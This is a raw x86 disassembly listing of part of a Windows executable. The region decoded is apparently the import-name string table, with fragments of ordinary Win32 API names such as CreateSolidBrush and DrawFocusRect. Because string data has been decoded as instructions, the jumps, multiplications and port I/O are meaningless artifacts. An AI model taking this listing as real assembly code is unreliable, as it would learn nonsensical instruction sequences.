  41dd28:	je     0x41dd8f
  41dd2a:	jb     0x41dd6f
  41dd2c:	jb     0x41dd97
  41dd2e:	je     0x41dd99
  41dd30:	arpl   WORD PTR [ecx+0x6c],sp
  41dd33:	push   ebx
  41dd34:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41dd39:	outs   dx,BYTE PTR ds:[esi]
  41dd3a:	add    BYTE PTR [eax],al
  41dd3c:	pop    edi
  41dd3d:	add    al,0x54
  41dd3f:	ins    BYTE PTR es:[edi],dx
  41dd40:	jae    0x41dd89
  41dd42:	gs je  0x41dd9b
  41dd45:	popa   
  41dd46:	ins    BYTE PTR es:[edi],dx
  41dd47:	jne    0x41ddae
  41dd49:	add    BYTE PTR [ebx+0x61654802],ah
  41dd4f:	jo     0x41dd94
  41dd51:	jb     0x41ddb8
  41dd53:	popa   
  41dd54:	je     0x41ddbb
  41dd56:	add    BYTE PTR [eax],al
  41dd58:	dec    ebp
  41dd59:	add    al,0x53
  41dd5b:	ins    BYTE PTR es:[edi],dx
  41dd5c:	gs gs jo 0x41dd60
  41dd60:	jnp    0x41dd63
  41dd62:	inc    esi
  41dd63:	outs   dx,DWORD PTR ds:[esi]
  41dd64:	ins    BYTE PTR es:[edi],dx
  41dd65:	fs push ebx
  41dd67:	je     0x41dddb
  41dd69:	imul   ebp,DWORD PTR [esi+0x67],0x47a0057
  41dd70:	push   esi
  41dd71:	gs jb  0x41ddc7
  41dd74:	gs je  0x41ddba
  41dd77:	outs   dx,DWORD PTR ds:[esi]
  41dd78:	outs   dx,BYTE PTR ds:[esi]
  41dd79:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  41dd82:	imul   eax,DWORD PTR [eax],0xffffff94
  41dd85:	add    al,0x57
  41dd87:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  41dd8e:	in     eax,dx
  41dd8f:	add    BYTE PTR [ebx+0x72],al
  41dd92:	gs popa 
  41dd94:	je     0x41ddfb
  41dd96:	push   esp
  41dd97:	push   0x64616572
  41dd9c:	add    BYTE PTR [eax],al
  41dd9e:	rol    BYTE PTR [eax],cl
  41dda0:	inc    ebx
  41dda1:	jb     0x41de08
  41dda3:	popa   
  41dda4:	je     0x41de0b
  41dda6:	inc    esi
  41dda7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41ddaf:	outs   dx,BYTE PTR ds:[esi]
  41ddb0:	addr16 push edi
  41ddb2:	add    BYTE PTR [eax],al
  41ddb4:	mov    ah,0x0
  41ddb6:	inc    ebx
  41ddb7:	outs   dx,DWORD PTR ds:[esi]
  41ddb8:	ins    DWORD PTR es:[edi],dx
  41ddb9:	jo     0x41de1c
  41ddbb:	jb     0x41de22
  41ddbd:	push   ebx
  41ddbe:	je     0x41de32
  41ddc0:	imul   ebp,DWORD PTR [esi+0x67],0xfe000057
  41ddc7:	add    BYTE PTR [ebp+eiz*2+0x66],al
  41ddcb:	imul   ebp,DWORD PTR [esi+0x65],0x44736f44
  41ddd2:	gs jbe 0x41de3e
  41ddd5:	arpl   WORD PTR [ebp+0x57],sp
  41ddd8:	add    BYTE PTR [eax],al
  41ddda:	out    0x0,eax
  41dddc:	inc    ebx
  41dddd:	jb     0x41de44
  41dddf:	popa   
  41dde0:	je     0x41de47
  41dde2:	push   ebx
  41dde3:	gs ins DWORD PTR es:[edi],dx
  41dde5:	popa   
  41dde6:	jo     0x41de50
  41dde8:	outs   dx,DWORD PTR ds:[esi]
  41dde9:	jb     0x41de50
  41ddeb:	inc    ecx
  41ddec:	add    BYTE PTR [eax],al
  41ddee:	fadd   QWORD PTR [ebx]
  41ddf0:	push   ebx
  41ddf1:	gs popa 
  41ddf3:	jb     0x41de58
  41ddf5:	push   0x68746150
  41ddfa:	push   edi
  41ddfb:	add    BYTE PTR [eax+eax*1+0x636e6143],ah
  41de02:	gs ins BYTE PTR es:[edi],dx
  41de04:	dec    ecx
  41de05:	outs   dx,DWORD PTR ds:[esi]
  41de06:	add    BYTE PTR [eax],al
  41de08:	add    al,0x3
  41de0a:	dec    esp
  41de0b:	gs popa 
  41de0d:	jbe    0x41de74
  41de0f:	inc    ebx
  41de10:	jb     0x41de7b
  41de12:	je     0x41de7d
  41de14:	arpl   WORD PTR [ecx+0x6c],sp
  41de17:	push   ebx
  41de18:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41de1d:	outs   dx,BYTE PTR ds:[esi]
  41de1e:	add    BYTE PTR [eax],al
  41de20:	inc    ebp
  41de21:	add    al,BYTE PTR [edi+0x65]
  41de24:	je     0x41de79
  41de26:	je     0x41de89
  41de28:	jb     0x41de9e
  41de2a:	jne    0x41de9c
  41de2c:	dec    ecx
  41de2d:	outs   dx,BYTE PTR ds:[esi]
  41de2e:	outs   dx,WORD PTR ds:[esi]
  41de30:	push   edi
  41de31:	add    dl,bl
  41de33:	add    cl,BYTE PTR [ecx+0x73]
  41de36:	push   esi
  41de37:	popa   
  41de38:	ins    BYTE PTR es:[edi],dx
  41de39:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  41de41:	addr16 gs inc edi
  41de44:	jb     0x41deb5
  41de46:	jne    0x41deb8
  41de48:	add    BYTE PTR [eax],al
  41de4a:	in     al,0x3
  41de4c:	push   ebx
  41de4d:	gs je  0x41de93
  41de50:	outs   dx,DWORD PTR ds:[esi]
  41de51:	ins    DWORD PTR es:[edi],dx
  41de52:	ins    DWORD PTR es:[edi],dx
  41de53:	push   esp
  41de54:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  41de5b:	add    BYTE PTR [edx+0x4],dl
  41de5e:	push   ebx
  41de5f:	jns    0x41ded4
  41de61:	je     0x41dec8
  41de63:	ins    DWORD PTR es:[edi],dx
  41de64:	push   esp
  41de65:	imul   ebp,DWORD PTR [ebp+0x65],0x69466f54
  41de6c:	ins    BYTE PTR es:[edi],dx
  41de6d:	gs push esp
  41de6f:	imul   ebp,DWORD PTR [ebp+0x65],0x32b0000
  41de76:	dec    ebp
  41de77:	outs   dx,DWORD PTR ds:[esi]
  41de78:	jbe    0x41dedf
  41de7a:	inc    esi
  41de7b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xc5004178
  41de83:	add    al,0x6c
  41de85:	jae    0x41defb
  41de87:	jb     0x41deec
  41de89:	ins    DWORD PTR es:[edi],dx
  41de8a:	jo     0x41def5
  41de8c:	inc    ecx
  41de8d:	add    BYTE PTR [ecx+0x2],cl
  41de90:	inc    edi
  41de91:	gs je  0x41dee7
  41de94:	je     0x41df08
  41de96:	imul   ebp,DWORD PTR [esi+0x67],0x65707954
  41de9d:	inc    ebp
  41de9e:	js     0x41def7
  41dea0:	add    BYTE PTR [eax],al
  41dea2:	fld    QWORD PTR [eax]
  41dea4:	inc    ebx
  41dea5:	jb     0x41df0c
  41dea7:	popa   
  41dea8:	je     0x41df0f
  41deaa:	dec    ebp
  41deab:	jne    0x41df21
  41dead:	gs js  0x41def1
  41deb0:	add    BYTE PTR [eax],al
  41deb2:	dec    ebx
  41deb3:	inc    ebp
  41deb4:	push   edx
  41deb5:	dec    esi
  41deb6:	inc    ebp
  41deb7:	dec    esp
  41deb8:	xor    esi,DWORD PTR [edx]
  41deba:	cs fs ins BYTE PTR es:[edi],dx
  41debd:	ins    BYTE PTR es:[edi],dx
  41debe:	add    BYTE PTR [eax],al
  41dec0:	jno    0x41dec3
  41dec2:	inc    edi
  41dec3:	gs je  0x41df18
  41dec6:	dec    edi
  41dec7:	push   eax
  41dec8:	xor    al,BYTE PTR [eax]
  41deca:	mov    cl,0x0
  41decc:	inc    esp
  41decd:	push   eax
  41dece:	je     0x41df3f
  41ded0:	dec    esp
  41ded1:	push   eax
  41ded2:	add    BYTE PTR [eax],al
  41ded4:	fld    QWORD PTR [ecx]
  41ded6:	push   ebx
  41ded7:	gs je  0x41df1e
  41deda:	dec    ecx
  41dedb:	inc    edx
  41dedc:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x6e4500c5
  41dee4:	jne    0x41df53
  41dee6:	inc    esi
  41dee7:	outs   dx,DWORD PTR ds:[esi]
  41dee8:	outs   dx,BYTE PTR ds:[esi]
  41dee9:	je     0x41df31
  41deeb:	popa   
  41deec:	ins    DWORD PTR es:[edi],dx
  41deed:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0xa2005773
  41def5:	add    BYTE PTR [ebx+0x72],al
  41def8:	gs popa 
  41defa:	je     0x41df61
  41defc:	dec    ecx
  41defd:	inc    ebx
  41defe:	push   edi
  41deff:	add    BYTE PTR [ecx+0x1],bh
  41df02:	inc    edi
  41df03:	gs je  0x41df59
  41df06:	jns    0x41df7b
  41df08:	je     0x41df6f
  41df0a:	ins    DWORD PTR es:[edi],dx
  41df0b:	push   eax
  41df0c:	popa   
  41df0d:	ins    BYTE PTR es:[edi],dx
  41df0e:	gs je  0x41df85
  41df11:	gs inc ebp
  41df13:	outs   dx,BYTE PTR ds:[esi]
  41df14:	je     0x41df88
  41df16:	imul   esp,DWORD PTR [ebp+0x73],0x4300ab00
  41df1d:	jb     0x41df84
  41df1f:	popa   
  41df20:	je     0x41df87
  41df22:	push   edx
  41df23:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41df28:	outs   dx,BYTE PTR ds:[esi]
  41df29:	add    BYTE PTR [edi+0x1],bl
  41df2c:	inc    edi
  41df2d:	gs je  0x41df7d
  41df30:	popa   
  41df31:	jo     0x41df80
  41df33:	outs   dx,DWORD PTR ds:[esi]
  41df34:	fs add BYTE PTR gs:[eax],al
  41df38:	lahf   
  41df39:	add    BYTE PTR [ebx+0x72],al
  41df3c:	gs popa 
  41df3e:	je     0x41dfa5
  41df40:	dec    eax
  41df41:	popa   
  41df42:	ins    BYTE PTR es:[edi],dx
  41df43:	data16 je 0x41dfb5
  41df46:	outs   dx,BYTE PTR ds:[esi]
  41df47:	gs push eax
  41df49:	popa   
  41df4a:	ins    BYTE PTR es:[edi],dx
  41df4b:	gs je  0x41dfc2
  41df4e:	gs add dh,ch
  41df51:	add    DWORD PTR [ebx+0x65],edx
  41df54:	je     0x41dfa6
  41df56:	popa   
  41df57:	ins    BYTE PTR es:[edi],dx
  41df58:	gs je  0x41dfcf
  41df5b:	gs inc ebp
  41df5d:	outs   dx,BYTE PTR ds:[esi]
  41df5e:	je     0x41dfd2
  41df60:	imul   esp,DWORD PTR [ebp+0x73],0x43009400
  41df67:	jb     0x41dfce
  41df69:	popa   
  41df6a:	je     0x41dfd1
  41df6c:	inc    esp
  41df6d:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41df74:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  41df78:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd50070
  41df80:	inc    ebp
  41df81:	js     0x41dff7
  41df83:	push   esp
  41df84:	gs js  0x41dffb
  41df87:	dec    edi
  41df88:	jne    0x41dffe
  41df8a:	push   edi
  41df8b:	add    BYTE PTR [edx+eax*1],cl
  41df8e:	push   esp
  41df8f:	gs js  0x41e006
  41df92:	dec    edi
  41df93:	jne    0x41e009
  41df95:	push   edi
  41df96:	add    BYTE PTR [eax],al
  41df98:	dec    ebx
  41df99:	add    DWORD PTR [edi+0x65],eax
  41df9c:	je     0x41dfe4
  41df9e:	outs   dx,DWORD PTR ds:[esi]
  41df9f:	outs   dx,BYTE PTR ds:[esi]
  41dfa0:	je     0x41dfe6
  41dfa2:	popa   
  41dfa3:	je     0x41e006
  41dfa5:	add    BYTE PTR [edi],bh
  41dfa7:	add    DWORD PTR [edi+0x65],eax
  41dfaa:	je     0x41dff0
  41dfac:	dec    ecx
  41dfad:	inc    edx
  41dfae:	inc    ebx
  41dfaf:	outs   dx,DWORD PTR ds:[esi]
  41dfb0:	ins    BYTE PTR es:[edi],dx
  41dfb1:	outs   dx,DWORD PTR ds:[esi]
  41dfb2:	jb     0x41e008
  41dfb4:	popa   
  41dfb5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41dfb9:	add    BYTE PTR [ecx+eax*1+0x796c6f50],dh
  41dfc0:	ins    BYTE PTR es:[edi],dx
  41dfc1:	imul   ebp,DWORD PTR [esi+0x65],0x1890000
  41dfc8:	inc    edi
  41dfc9:	gs je  0x41e020
  41dfcc:	gs js  0x41e043
  41dfcf:	inc    esi
  41dfd0:	popa   
  41dfd1:	arpl   WORD PTR [ebp+0x57],sp
  41dfd4:	add    BYTE PTR [eax],al
  41dfd6:	jnp    0x41dfd9
  41dfd8:	inc    edi
  41dfd9:	gs je  0x41e030
  41dfdc:	gs js  0x41e053
  41dfdf:	inc    ecx
  41dfe0:	ins    BYTE PTR es:[edi],dx
  41dfe1:	imul   esp,DWORD PTR [edi+0x6e],0x890000
  41dfe8:	inc    ebx
  41dfe9:	jb     0x41e050
  41dfeb:	popa   
  41dfec:	je     0x41e053
  41dfee:	inc    edx
  41dfef:	jb     0x41e066
  41dff1:	jae    0x41e05b
  41dff3:	dec    ecx
  41dff4:	outs   dx,BYTE PTR ds:[esi]
  41dff5:	imul   esi,DWORD PTR fs:[edx+0x65],0x24007463
  41dffd:	add    DWORD PTR [edi+0x65],eax
  41e000:	je     0x41e044
  41e002:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  41e006:	add    BYTE PTR gs:[ecx+eax*1+0x47],bl
  41e00b:	gs je  0x41e05a
  41e00e:	popa   
  41e00f:	jns    0x41e080
  41e011:	jne    0x41e087
  41e013:	add    BYTE PTR [eax+0x65724300],dh
  41e019:	popa   
  41e01a:	je     0x41e081
  41e01c:	push   ebx
  41e01d:	outs   dx,DWORD PTR ds:[esi]
  41e01e:	ins    BYTE PTR es:[edi],dx
  41e01f:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  41e027:	add    ah,al
  41e029:	add    BYTE PTR [ebp+0x6e],al
  41e02c:	jne    0x41e09b
  41e02e:	inc    esi
  41e02f:	outs   dx,DWORD PTR ds:[esi]
  41e030:	outs   dx,BYTE PTR ds:[esi]
  41e031:	je     0x41e079
  41e033:	popa   
  41e034:	ins    DWORD PTR es:[edi],dx
  41e035:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41e03d:	add    BYTE PTR [eax+0x65724300],cl
  41e043:	popa   
  41e044:	je     0x41e0ab
  41e046:	inc    edx
  41e047:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  41e04f:	imul   esi,DWORD PTR [edx+0x65],0x7463
  41e056:	xchg   DWORD PTR [eax],eax
  41e058:	inc    ebx
  41e059:	jb     0x41e0c0
  41e05b:	popa   
  41e05c:	je     0x41e0c3
  41e05e:	inc    edx
  41e05f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa7000070
  41e067:	add    BYTE PTR [ebx+0x72],al
  41e06a:	gs popa 
  41e06c:	je     0x41e0d3
  41e06e:	push   eax
  41e06f:	outs   dx,BYTE PTR gs:[esi]
  41e071:	add    BYTE PTR [edx+0x65724300],dl
  41e077:	popa   
  41e078:	je     0x41e0df
  41e07a:	inc    esp
  41e07b:	dec    ecx
  41e07c:	inc    edx
  41e07d:	push   ebx
  41e07e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41e083:	outs   dx,BYTE PTR ds:[esi]
  41e084:	add    BYTE PTR [eax],al
  41e086:	add    DWORD PTR [eax],0x626d6f43
  41e08c:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  41e093:	add    BYTE PTR [esi+0x1],ah
  41e096:	inc    edi
  41e097:	gs je  0x41e0e8
  41e09a:	gs popa 
  41e09c:	jb     0x41e103
  41e09e:	jae    0x41e114
  41e0a0:	push   eax
  41e0a1:	popa   
  41e0a2:	ins    BYTE PTR es:[edi],dx
  41e0a3:	gs je  0x41e11a
  41e0a6:	gs dec ecx
  41e0a8:	outs   dx,BYTE PTR ds:[esi]
  41e0a9:	fs gs js 0x41e0ad
  41e0ad:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  41e0b4:	jo     0x41e129
  41e0b6:	add    BYTE PTR gs:[edx+0x74654701],cl
  41e0bd:	push   esp
  41e0be:	gs js  0x41e135
  41e0c1:	dec    ebp
  41e0c2:	gs je  0x41e137
  41e0c5:	imul   esp,DWORD PTR [ebx+0x73],0x1b80041
  41e0cc:	push   edx
  41e0cd:	gs popa 
  41e0cf:	ins    BYTE PTR es:[edi],dx
  41e0d0:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  41e0d7:	je     0x41e14d
  41e0d9:	add    BYTE PTR gs:[eax],al
  41e0dc:	lar    edx,WORD PTR [ebp+0x6e]
  41e0e0:	jb     0x41e147
  41e0e2:	popa   
  41e0e3:	ins    BYTE PTR es:[edi],dx
  41e0e4:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  41e0eb:	arpl   WORD PTR [eax+eax*1-0x6],si
  41e0ef:	add    DWORD PTR [ebx+0x65],edx
  41e0f2:	je     0x41e148
  41e0f4:	gs js  0x41e16b
  41e0f7:	inc    ebx
  41e0f8:	outs   dx,DWORD PTR ds:[esi]
  41e0f9:	ins    BYTE PTR es:[edi],dx
  41e0fa:	outs   dx,DWORD PTR ds:[esi]
  41e0fb:	jb     0x41e0fd
  41e0fd:	add    BYTE PTR [esi+0x646e4500],bh
  41e103:	inc    esp
  41e104:	outs   dx,DWORD PTR ds:[esi]
  41e105:	arpl   WORD PTR [eax],ax
  41e107:	add    BYTE PTR [edx+0x1],bh
  41e10a:	inc    edi
  41e10b:	gs je  0x41e161
  41e10e:	jns    0x41e183
  41e110:	je     0x41e177
  41e112:	ins    DWORD PTR es:[edi],dx
  41e113:	push   eax
  41e114:	popa   
  41e115:	ins    BYTE PTR es:[edi],dx
  41e116:	gs je  0x41e18d
  41e119:	gs push ebp
  41e11b:	jae    0x41e182
  41e11d:	add    dh,bl
  41e11f:	add    DWORD PTR [ebx+0x65],edx
  41e122:	je     0x41e168
  41e124:	dec    ecx
  41e125:	inc    edx
  41e126:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  41e12e:	imul   esp,DWORD PTR [ebx+0x65],0x5301dc00
  41e135:	gs je  0x41e17c
  41e138:	dec    ecx
  41e139:	inc    edx
  41e13a:	inc    ebx
  41e13b:	outs   dx,DWORD PTR ds:[esi]
  41e13c:	ins    BYTE PTR es:[edi],dx
  41e13d:	outs   dx,DWORD PTR ds:[esi]
  41e13e:	jb     0x41e194
  41e140:	popa   
  41e141:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e145:	add    al,dl
  41e147:	add    DWORD PTR [ebx+0x65],edx
  41e14a:	je     0x41e18d
  41e14c:	bound  ebp,QWORD PTR [edi+0x72]
  41e14f:	je     0x41e1a1
  41e151:	jb     0x41e1c2
  41e153:	arpl   WORD PTR [eax],ax
  41e155:	add    ah,al
  41e157:	add    DWORD PTR [edx+0x65],edx
  41e15a:	jae    0x41e1c5
  41e15c:	jp     0x41e1c3
  41e15e:	push   eax
  41e15f:	popa   
  41e160:	ins    BYTE PTR es:[edi],dx
  41e161:	gs je  0x41e1d8
  41e164:	add    BYTE PTR gs:[edx+eax*1],dl
  41e168:	push   edi
  41e169:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41e171:	add    dh,cl
  41e173:	add    BYTE PTR [ebp+0x78],al
  41e176:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  41e17a:	gs inc ebx
  41e17c:	ins    BYTE PTR es:[edi],dx
  41e17d:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41e184:	xchg   esi,eax
  41e185:	add    BYTE PTR [ebx+0x72],al
  41e188:	gs popa 
  41e18a:	je     0x41e1f1
  41e18c:	inc    ebp
  41e18d:	ins    BYTE PTR es:[edi],dx
  41e18e:	ins    BYTE PTR es:[edi],dx
  41e18f:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  41e196:	outs   dx,BYTE PTR ds:[esi]
  41e197:	dec    ecx
  41e198:	outs   dx,BYTE PTR ds:[esi]
  41e199:	imul   esi,DWORD PTR fs:[edx+0x65],0xc1007463
  41e1a1:	add    DWORD PTR [edx+0x65],edx
  41e1a4:	ins    DWORD PTR es:[edi],dx
  41e1a5:	outs   dx,DWORD PTR ds:[esi]
  41e1a6:	jbe    0x41e20d
  41e1a8:	inc    esi
  41e1a9:	outs   dx,DWORD PTR ds:[esi]
  41e1aa:	outs   dx,BYTE PTR ds:[esi]
  41e1ab:	je     0x41e1ff
  41e1ad:	gs jae 0x41e21f
  41e1b0:	jne    0x41e224
  41e1b2:	arpl   WORD PTR [ebp+0x57],sp
  41e1b5:	add    BYTE PTR [edi+0x65724300],cl
  41e1bb:	popa   
  41e1bc:	je     0x41e223
  41e1be:	inc    esp
  41e1bf:	inc    ebx
  41e1c0:	push   edi
  41e1c1:	add    BYTE PTR [edx+0x65724300],ch
  41e1c7:	popa   
  41e1c8:	je     0x41e22f
  41e1ca:	push   eax
  41e1cb:	outs   dx,DWORD PTR ds:[esi]
  41e1cc:	ins    BYTE PTR es:[edi],dx
  41e1cd:	jns    0x41e236
  41e1cf:	outs   dx,DWORD PTR ds:[esi]
  41e1d0:	outs   dx,BYTE PTR ds:[esi]
  41e1d1:	push   edx
  41e1d2:	outs   dx,BYTE PTR ds:[si]
  41e1d4:	add    BYTE PTR [eax],al
  41e1d6:	mov    es,WORD PTR [ecx]
  41e1d8:	inc    edi
  41e1d9:	gs je  0x41e232
  41e1dc:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41e1e3:	dec    edi
  41e1e4:	jb     0x41e24d
  41e1e6:	inc    ebp
  41e1e7:	js     0x41e1e9
  41e1e9:	add    BYTE PTR [edi+0x44],al
  41e1ec:	dec    ecx
  41e1ed:	xor    esi,DWORD PTR [edx]
  41e1ef:	cs fs ins BYTE PTR es:[edi],dx
  41e1f2:	ins    BYTE PTR es:[edi],dx
  41e1f3:	add    BYTE PTR [eax+eax*1+0x74736544],dl
  41e1fa:	jb     0x41e26b
  41e1fc:	jns    0x41e241
  41e1fe:	popa   
  41e1ff:	jb     0x41e266
  41e201:	je     0x41e203
  41e203:	add    BYTE PTR [eax+0x61724400],dh
  41e209:	ja     0x41e251
  41e20b:	outs   dx,DWORD PTR ds:[esi]
  41e20c:	arpl   WORD PTR [ebp+0x73],si
  41e20f:	push   edx
  41e210:	arpl   WORD PTR gs:[eax+eax*1-0x4e],si
  41e215:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e219:	fs dec ecx
  41e21b:	ins    DWORD PTR es:[edi],dx
  41e21c:	popa   
  41e21d:	addr16 gs push edi
  41e220:	add    BYTE PTR [eax],al
  41e222:	mov    eax,0x69615702
  41e227:	je     0x41e276
  41e229:	gs jae 0x41e29f
  41e22c:	popa   
  41e22d:	add    BYTE PTR gs:[bx+0x4400],dl
  41e233:	gs jae 0x41e2aa
  41e236:	jb     0x41e2a7
  41e238:	jns    0x41e287
  41e23a:	outs   dx,BYTE PTR gs:[esi]
  41e23c:	jne    0x41e23e
  41e23e:	stos   DWORD PTR es:[edi],eax
  41e23f:	add    BYTE PTR [edx+esi*2+0x61],al
  41e243:	ja     0x41e286
  41e245:	outs   dx,BYTE PTR ds:[esi]
  41e246:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  41e24d:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  41e252:	mov    BYTE PTR [eax],al
  41e254:	inc    esp
  41e255:	gs inc sp
  41e258:	ins    BYTE PTR es:[edi],dx
  41e259:	addr16 push eax
  41e25b:	jb     0x41e2cc
  41e25d:	arpl   WORD PTR [edi+0x0],dx
  41e260:	add    DWORD PTR [eax],eax
  41e262:	inc    ecx
  41e263:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41e267:	popa   
  41e268:	je     0x41e2cf
  41e26a:	dec    ebx
  41e26b:	gs jns 0x41e2d0
  41e26e:	outs   dx,DWORD PTR ds:[esi]
  41e26f:	popa   
  41e270:	jb     0x41e2d6
  41e272:	dec    esp
  41e273:	popa   
  41e274:	jns    0x41e2e5
  41e276:	jne    0x41e2ec
  41e278:	add    BYTE PTR [eax],al
  41e27a:	data16 add dl,BYTE PTR [ebx+0x65]
  41e27e:	je     0x41e2d4
  41e280:	imul   ebp,DWORD PTR [ebp+0x65],0x75000072
  41e287:	add    DWORD PTR [edi+0x65],eax
  41e28a:	je     0x41e2e3
  41e28c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e293:	js     0x41e309
  41e295:	inc    ecx
  41e296:	add    BYTE PTR [eax],al
  41e298:	and    eax,0x6e655302
  41e29d:	fs dec ecx
  41e29f:	outs   dx,BYTE PTR ds:[esi]
  41e2a0:	jo     0x41e317
  41e2a2:	je     0x41e2a4
  41e2a4:	mov    edi,0x636f4c01
  41e2a9:	imul   edx,DWORD PTR [edi+0x69],0x6e
  41e2ad:	outs   dx,DWORD PTR fs:[esi]
  41e2af:	ja     0x41e306
  41e2b1:	jo     0x41e317
  41e2b3:	popa   
  41e2b4:	je     0x41e31b
  41e2b6:	add    BYTE PTR [eax],al
  41e2b8:	mov    bh,0x2
  41e2ba:	push   edi
  41e2bb:	popa   
  41e2bc:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  41e2c4:	jne    0x41e33a
  41e2c6:	dec    ecx
  41e2c7:	fs ins BYTE PTR es:[edi],dx
  41e2c9:	add    BYTE PTR gs:[eax],al
  41e2cc:	dec    eax
  41e2cd:	add    dl,BYTE PTR [ebx+0x65]
  41e2d0:	je     0x41e31f
  41e2d2:	outs   dx,BYTE PTR gs:[esi]
  41e2d4:	jne    0x41e2d6
  41e2d6:	sub    eax,DWORD PTR [ecx]
  41e2d8:	inc    edi
  41e2d9:	gs je  0x41e329
  41e2dc:	outs   dx,BYTE PTR gs:[esi]
  41e2de:	jne    0x41e2e0
  41e2e0:	adc    eax,DWORD PTR [edx]
  41e2e2:	push   edx
  41e2e3:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  41e2ec:	outs   dx,BYTE PTR ds:[esi]
  41e2ed:	outs   dx,DWORD PTR fs:[esi]
  41e2ef:	ja     0x41e33e
  41e2f1:	gs jae 0x41e367
  41e2f4:	popa   
  41e2f5:	addr16 gs push edi
  41e2f8:	add    BYTE PTR [eax],al
  41e2fa:	push   ebp
  41e2fb:	add    DWORD PTR [edi+0x65],eax
  41e2fe:	je     0x41e353
  41e300:	arpl   WORD PTR [edx+0x6f],si
  41e303:	ins    BYTE PTR es:[edi],dx
  41e304:	ins    BYTE PTR es:[edi],dx
  41e305:	push   eax
  41e306:	outs   dx,DWORD PTR ds:[esi]
  41e307:	jae    0x41e309
  41e309:	add    bh,cl
  41e30b:	add    DWORD PTR [ebp+0x65],ecx
  41e30e:	jae    0x41e383
  41e310:	popa   
  41e311:	addr16 gs inc edx
  41e314:	outs   dx,DWORD PTR ds:[esi]
  41e315:	js     0x41e35c
  41e317:	js     0x41e35a
  41e319:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  41e320:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x65470164
  41e328:	je     0x41e37f
  41e32a:	jo     0x41e390
  41e32c:	popa   
  41e32d:	je     0x41e394
  41e32f:	push   edx
  41e330:	outs   dx,BYTE PTR ds:[si]
  41e332:	add    BYTE PTR [eax],al
  41e334:	mov    dh,0x1
  41e336:	dec    esp
  41e337:	outs   dx,DWORD PTR ds:[esi]
  41e338:	popa   
  41e339:	fs dec ebp
  41e33b:	outs   dx,BYTE PTR gs:[esi]
  41e33d:	jne    0x41e380
  41e33f:	add    BYTE PTR [ecx],cl
  41e341:	add    BYTE PTR [ecx+0x70],al
  41e344:	jo     0x41e3ab
  41e346:	outs   dx,BYTE PTR ds:[esi]
  41e347:	fs dec ebp
  41e349:	outs   dx,BYTE PTR gs:[esi]
  41e34b:	jne    0x41e3a4
  41e34d:	add    BYTE PTR [ebp+0x0],bl
  41e350:	inc    ebx
  41e351:	jb     0x41e3b8
  41e353:	popa   
  41e354:	je     0x41e3bb
  41e356:	dec    ecx
  41e357:	arpl   WORD PTR [edi+0x6e],bp
  41e35a:	dec    ecx
  41e35b:	outs   dx,BYTE PTR ds:[esi]
  41e35c:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  41e364:	ins    BYTE PTR es:[edi],dx
  41e365:	add    DWORD PTR [edi+0x65],eax
  41e368:	je     0x41e3c1
  41e36a:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e371:	outs   dx,BYTE PTR ds:[esi]
  41e372:	addr16 inc ecx
  41e374:	add    BYTE PTR [eax],al
  41e376:	ja     0x41e379
  41e378:	inc    edi
  41e379:	gs je  0x41e3d3
  41e37c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e383:	js     0x41e3f9
  41e385:	dec    esp
  41e386:	outs   dx,BYTE PTR gs:[esi]
  41e388:	addr16 je 0x41e3f3
  41e38b:	push   edi
  41e38c:	add    BYTE PTR [eax],al
  41e38e:	cmp    eax,0x65684300
  41e393:	arpl   WORD PTR [ebx+0x52],bp
  41e396:	popa   
  41e397:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  41e39f:	outs   dx,BYTE PTR ds:[esi]
  41e3a0:	add    BYTE PTR [eax],al
  41e3a2:	add    BYTE PTR [ecx],0x49
  41e3a5:	outs   dx,BYTE PTR ds:[esi]
  41e3a6:	data16 ins BYTE PTR es:[edi],dx
  41e3a8:	popa   
  41e3a9:	je     0x41e410
  41e3ab:	push   edx
  41e3ac:	arpl   WORD PTR gs:[eax+eax*1-0x70],si
  41e3b1:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41e3b5:	arpl   WORD PTR [ebx+0x50],bp
